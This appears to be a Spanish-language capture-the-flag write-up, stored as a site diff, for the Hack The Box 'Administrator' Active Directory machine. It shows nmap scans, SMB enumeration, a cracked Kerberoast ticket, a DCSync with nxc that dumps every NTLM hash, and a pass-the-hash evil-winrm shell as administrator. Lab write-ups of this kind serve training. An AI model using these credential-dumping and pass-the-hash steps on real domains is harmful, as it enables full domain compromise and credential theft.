$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$ADMINISTRATOR.htb/ethan*$66eaa14ca29fe4fbfadfc7dc81b18730$6b3b78c7fd664d7d39d3bff5567328b10759306a4cf7124e1322e63c4abdfe419bff877d4c7e74eccc542951d18016ca5b0f3ccefddd2bdba597c50b8ff4faf2db3a3d82b7c507564f76c2d26695430ebc6faa36cff5993e9d275068a201c8668436887b8719725535a091fce09ac2ddf028fb093abb3898a6086f229967de5c4a7f5fd20d6035273723d038849da8e3b2bac0372e37472e17604772e498e619e95c4a3d736479d6837762131a2b995f9368fd9ffccc76620b25ad893e9a36e922cff25fe07f56b975a7ca1c38660888e9be0662ced2d9340491383b4cbe0d05c2578b66f3470bd07d4e0de11ff819a2622a6348e7c21b6127c513bdec7fc890b51729aca24195349f06fcf205b71a9d3f074cfa3157f87cf31c070fe44a1abbc1a4ea5a23825437acc30999d5abdfbee0be38ad583526abf44dac8b60a0f48b0ade25abaa906c469ab1f00307b76178dbef0cf767320ba1868c052bb9e318d3cddbea6e4059fd6aaa99600ba6e969ec7144b688963f402793b03118a961627a55fefd040b4e8255347da60787d9b301039fb777746a639808f7627fd23f2ef297c370b7058408abf4e901bef2a1cb4d26ce231a6825400e13e9f34c42dd9b7ee7de233e1f4f97327109ba7f8a5633f40bcaa90e624f5bba2da30f449ee39b29d9de793fbbd7e90ccd10105d3c375b42bab66ff911dbc1c7ecf7c790e865f41b89e2fe87434aefda2a5e5eb93f004ce780384a9706d522be678dcfe5b98e8f4eb33ac12311b017023747f5318dda3a67a04358cccd4d38a554a3d8d09fe380f8535b6bc4e1504bcc3d169837a6fad24ca7b3df9ab8a7d1cbc00877e35da141f24f35a19a1dd1c134b4410964a0ae0c18ad25af5a54a628e18fb3d1ec5da93d6e518a7b09d21e9dc3a3d627b80a39623ad685b2ee90e10fe4c710d4c9d0b0f145ca737ab8527074b8b5ea9cc1fa0b67be253660fab9cd18ccf34c8c14dee30d0b830ea16f2bf314ed44f060a7cf5bd1bf2cf93337f2b8f5d52b6e6fd331d52a7a85626db1d11249e5dadb758c0c8cca517fa5c629678a957f5b29c3ca5f9ee1d93fcf40af608ae7c34a4e3ef3838756b2108c08a7e9689394c781ae3d7f2313261b3f23f1e2d6fd0bec5a40a500952f3b300723c6679648a9b861413c6a4c5f361eb3f9a7d472567f517efe25977ddbc0c9f53d8c2aad0ab7022aa9f31e256ca8bb37a04c00d08e6cd7629a1187e90e9ecbe4e5eb2035f0a8dc87d16d21655e9590784ebc3b8c55dcbcd77b5cd089bc52af5538b067ae3aa3f862128fd17e2e24b497e2da67cad4a6c851f0261a9018858e3ac74f3974008f73301e491b5227e514222fdd43f7ea2938548e593fdd3a17effc62ae7b49066e39f218feb4462e2c0cfbe773f7a477ad9f43b8e80491c861d5c774213dd2d6d5e9766fe2afa21cf7cdafde6727e2ccd43acffa47b822b087dfdcbe11d0bcba892c73fdc2325cf2201101f2e3a85fe5b87b76935eb792631d0b4f5836e9f33c09c36608179ab6c0:limpbizkit Comprobación de credenciales:\n❯ nxc smb 10.10.11.42 -u 'ethan' -p 'limpbizkit' SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\ethan:limpbizkit DCSync Attack - nxc https://books.spartan-cybersec.com/cpad/persistencia-y-post-explotacion-en-ad/dcsync\nVemos que el usuario ethan del cual tenemos control actualmente tiene los permisos GetChangesAll y GetChanges sobre el dominio ADMINISTRATOR.HTB.\nEstos permisos nos permiten con nxc ejecutar el ataque DCSync, que consiste en solicitar información sensible del domain controler haciéndonos pasar por otro “domain controler”. En este caso solicitamos todos los hash NTLM/NTHash de los usuarios del sistema pero el que nos interesa es el del usuario administrator.\n❯ nxc smb 10.10.11.42 -u 'ethan' -p 'limpbizkit' -d 'administrator.htb' --ntds [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user to dump a specific user safely or the module -M ntdsutil [Y/n] y SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\ethan:limpbizkit SMB 10.10.11.42 445 DC [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied SMB 10.10.11.42 445 DC [+] Dumping the NTDS, this could take a while so go grab a redbull... SMB 10.10.11.42 445 DC Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e::: SMB 10.10.11.42 445 DC Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 10.10.11.42 445 DC krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6::: SMB 10.10.11.42 445 DC administrator.htb\\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7::: SMB 10.10.11.42 445 DC administrator.htb\\michael:1109:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: SMB 10.10.11.42 445 DC administrator.htb\\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: SMB 10.10.11.42 445 DC administrator.htb\\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31::: SMB 10.10.11.42 445 DC administrator.htb\\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884::: SMB 10.10.11.42 445 DC administrator.htb\\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199::: SMB 10.10.11.42 445 DC administrator.htb\\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9::: SMB 10.10.11.42 445 DC DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3::: SMB 10.10.11.42 445 DC [+] Dumped 11 NTDS hashes to /home/borhub/.nxc/logs/ntds/DC_10.10.11.42_2025-07-01_005803.ntds of which 10 were added to the database SMB 10.10.11.42 445 DC [*] To extract only enabled accounts from the output file, run the following command: SMB 10.10.11.42 445 DC [*] cat /home/borhub/.nxc/logs/ntds/DC_10.10.11.42_2025-07-01_005803.ntds | grep -iv disabled | cut -d ':' -f1 SMB 10.10.11.42 445 DC [*] grep -iv disabled /home/borhub/.nxc/logs/ntds/DC_10.10.11.42_2025-07-01_005803.ntds | cut -d ':' -f1 Ahora haciendo Pass The Hass (PtH) vamos a abrirnos una shell remota como administrator.\n❯ evil-winrm -i 10.10.11.42 -u Administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e' Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e type ../Desktop/root.txt d5de5a7bfa8f2aca3117e240ba182336 ",
+  "wordCount" : "2379",
+  "inLanguage": "en",
+  "image":"https://borhuub.github.io/static/logo_machines/administrator.png","datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Borhub"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://borhuub.github.io/writeups/administrator/administrator/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "My New Hugo Site",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://borhuub.github.io/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://borhuub.github.io/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://borhuub.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://borhuub.github.io/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://borhuub.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://borhuub.github.io/writeups/">Writeups</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Administrator
+    </h1>
+    <div class="post-description">
+      Writeups sobre la máquina Administrator en Active Directory de dificultad Media. Enumerando con bloodhound encontraremos un path claro que seguir para ir moviendonos entre usuarios, llegado cierto momento obtendremos un archivo con credenciales a través de FTP con el cual obtendremos el usuario que contiene la user flag. Para completar la escalada de privilegios volveremos a abusar de permisos GenericAll para realizar un kerberoast attack sobre el usuario ethan, luego abusando de permisos GetChangesAll y GetChanges realizaremos un DCSync attack para convertirnos en domain admin.
+    </div>
+    <div class="post-meta"><span>12 min</span>&nbsp;·&nbsp;<span>2379 words</span>&nbsp;·&nbsp;<span>Borhub</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#reconocimiento" aria-label="Reconocimiento">Reconocimiento</a></li>
+                <li>
+                    <a href="#bloodhound-enumeration" aria-label="BloodHound Enumeration">BloodHound Enumeration</a><ul>
+                        
+                <li>
+                    <a href="#kerberoast-attack" aria-label="Kerberoast attack">Kerberoast attack</a></li>
+                <li>
+                    <a href="#forcechangepassword---net-rpc" aria-label="ForceChangePassword - Net rpc">ForceChangePassword - Net rpc</a></li></ul>
+                </li>
+                <li>
+                    <a href="#acceso-inicial" aria-label="Acceso inicial">Acceso inicial</a><ul>
+                        
+                <li>
+                    <a href="#ftp-enumeration" aria-label="FTP Enumeration">FTP Enumeration</a></li></ul>
+                </li>
+                <li>
+                    <a href="#escalada-de-privilegios" aria-label="Escalada de privilegios">Escalada de privilegios</a><ul>
+                        
+                <li>
+                    <a href="#kerberoast-attack-1" aria-label="Kerberoast attack">Kerberoast attack</a></li>
+                <li>
+                    <a href="#dcsync-attack---nxc" aria-label="DCSync Attack - nxc">DCSync Attack - nxc</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img alt="Administrator Machine" loading="lazy" src="fotos/pwned.png"></p>
+<p>As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich</p>
+<h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
+<p>Escaneo de puertos abiertos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -p- -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.11.42 -oG ports
+</span></span><span class="line"><span class="cl">Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">&#39;up&#39;</span> and scan <span class="nb">times</span> may be slower.
+</span></span><span class="line"><span class="cl">Starting Nmap 7.97 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-30 11:49 +0200
+</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 11:49
+</span></span><span class="line"><span class="cl">Scanning 10.10.11.42 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Discovered open port 139/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Increasing send delay <span class="k">for</span> 10.10.11.42 from <span class="m">0</span> to <span class="m">5</span> due to <span class="m">158</span> out of <span class="m">526</span> dropped probes since last increase.
+</span></span><span class="line"><span class="cl">Discovered open port 21/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 445/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 53/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 135/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 49667/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 50958/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 3269/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 49665/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 9389/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 5985/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 636/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 61600/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 50963/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 50985/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 49664/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Increasing send delay <span class="k">for</span> 10.10.11.42 from <span class="m">5</span> to <span class="m">10</span> due to max_successful_tryno increase to <span class="m">4</span>
+</span></span><span class="line"><span class="cl">Increasing send delay <span class="k">for</span> 10.10.11.42 from <span class="m">10</span> to <span class="m">20</span> due to max_successful_tryno increase to <span class="m">5</span>
+</span></span><span class="line"><span class="cl">Increasing send delay <span class="k">for</span> 10.10.11.42 from <span class="m">20</span> to <span class="m">40</span> due to <span class="m">87</span> out of <span class="m">289</span> dropped probes since last increase.
+</span></span><span class="line"><span class="cl">Increasing send delay <span class="k">for</span> 10.10.11.42 from <span class="m">40</span> to <span class="m">80</span> due to max_successful_tryno increase to <span class="m">6</span>
+</span></span><span class="line"><span class="cl">Discovered open port 49668/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 389/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 88/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 3268/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 50947/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 49666/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 593/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 464/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 47001/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Discovered open port 50966/tcp on 10.10.11.42
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 11:50, 15.13s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.42
+</span></span><span class="line"><span class="cl">Host is up, received user-set <span class="o">(</span>0.045s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-06-30 11:49:53 CEST <span class="k">for</span> 15s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65509</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE          REASON
+</span></span><span class="line"><span class="cl">21/tcp    open  ftp              syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">53/tcp    open  domain           syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc            syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn      syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5         syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">593/tcp   open  http-rpc-epmap   syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">636/tcp   open  ldapssl          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3268/tcp  open  globalcatLDAP    syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  globalcatLDAPssl syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">5985/tcp  open  wsman            syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">9389/tcp  open  adws             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">47001/tcp open  winrm            syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49664/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49665/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49666/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49667/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49668/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">50947/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">50958/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">50963/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">50966/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">50985/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">61600/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 15.18 seconds
+</span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">73737</span> <span class="o">(</span>3.244MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">66196</span> <span class="o">(</span>2.648MB<span class="o">)</span>
+</span></span></code></pre></div><p>Escaneo todos los puertos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ports.py ports
+</span></span><span class="line"><span class="cl">​
+</span></span><span class="line"><span class="cl">🔍 Puertos encontrados:
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">21</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">53</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">88</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">135</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">139</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">389</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">445</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">464</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">593</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">636</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">3268</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">3269</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">5985</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">9389</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">47001</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49664</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49665</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49666</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49667</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49668</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">50947</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">50958</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">50963</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">50966</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">50985</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">61600</span>
+</span></span><span class="line"><span class="cl">​
+</span></span><span class="line"><span class="cl">¡Puertos copiados en el portapapeles!
+</span></span></code></pre></div><p>Escaneo de servicios:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -sCV -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,50947,50958,50963,50966,50985,61600 -Pn 10.10.11.42 -oN targeted
+</span></span><span class="line"><span class="cl">Starting Nmap 7.97 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-30 11:57 +0200
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.42
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.11s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">​
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">21/tcp    open  ftp           Microsoft ftpd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  SYST: Windows_NT
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-06-30 16:57:08Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: administrator.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: administrator.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49668/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">50947/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">50958/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">50963/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">50966/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">50985/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">61600/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">​
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3.1.1:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-06-30T16:58:05
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 6h59m50s
+</span></span><span class="line"><span class="cl">​
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 75.66 seconds
+</span></span></code></pre></div><p>Empezamos enumerando las carpetas compartidas pero no encontramos nada interesante.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.42 -u <span class="s1">&#39;Olivia&#39;</span> -p <span class="s1">&#39;ichliebedich&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB         10.10.11.42     <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:administrator.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.42     <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> administrator.htb<span class="se">\O</span>livia:ichliebedich
+</span></span><span class="line"><span class="cl">SMB         10.10.11.42     <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         10.10.11.42     <span class="m">445</span>    DC               Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         10.10.11.42     <span class="m">445</span>    DC               -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         10.10.11.42     <span class="m">445</span>    DC               ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         10.10.11.42     <span class="m">445</span>    DC               C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         10.10.11.42     <span class="m">445</span>    DC               IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         10.10.11.42     <span class="m">445</span>    DC               NETLOGON        READ            Logon server share
+</span></span><span class="line"><span class="cl">SMB         10.10.11.42     <span class="m">445</span>    DC               SYSVOL          READ            Logon serv
+</span></span></code></pre></div><h1 id="bloodhound-enumeration">BloodHound Enumeration<a hidden class="anchor" aria-hidden="true" href="#bloodhound-enumeration">#</a></h1>
+<p>Lanzamos el script <code>bloodhound-pyhton</code> y nos ponemos a mirar los permisos que tiene disponible el usuario Olivia.</p>
+<p>Es entonces cuando vemos que tenemos permisos <code>genericAll</code> sobre el usuario Michael.</p>
+<p><img alt="Administrator Machine 1" loading="lazy" src="fotos/Administrator_Machine_1.png"></p>
+<h2 id="kerberoast-attack">Kerberoast attack<a hidden class="anchor" aria-hidden="true" href="#kerberoast-attack">#</a></h2>
+<p>Entonces nos sincronizamos con la hora del dominio y lanzamos el ataque kerberoast para ver si el <code>Key Distribution Center (KDC)</code> nos devuelve el <code>Ticket Garanting Service (TGS)</code>.</p>
